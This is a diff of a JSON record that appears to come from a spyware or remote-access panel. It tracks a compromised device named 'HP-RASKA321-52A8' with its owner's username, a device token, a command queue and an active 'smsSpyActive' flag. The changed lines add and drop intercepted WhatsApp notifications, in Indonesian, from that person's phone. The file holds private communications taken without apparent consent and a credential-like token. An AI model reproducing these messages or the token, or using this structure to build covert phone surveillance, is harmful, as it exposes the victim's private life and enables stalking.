@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1775927280523,
+    "lastSeen": 1775927287549,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
+        "content": "‎4 pesan baru",
+        "time": "12/04 00:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927289121
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (3 pesan): ~ kkdap catalyst/reality",
+        "content": "💟 Stiker",
+        "time": "12/04 00:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775927282208
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
@@ -4107,22 +4123,6 @@
         "time": "11/04 23:05",
         "pkg": "com.whatsapp",
         "receivedAt": 1775923539381
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈 (3 pesan): ~ 𖣂",
-        "content": "batang ap lds",
-        "time": "11/04 23:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775923538253
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈",
-        "content": "‎2 pesan baru",
-        "time": "11/04 23:05",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775923534399
       }
     ],
     "galleryPhotos": [],
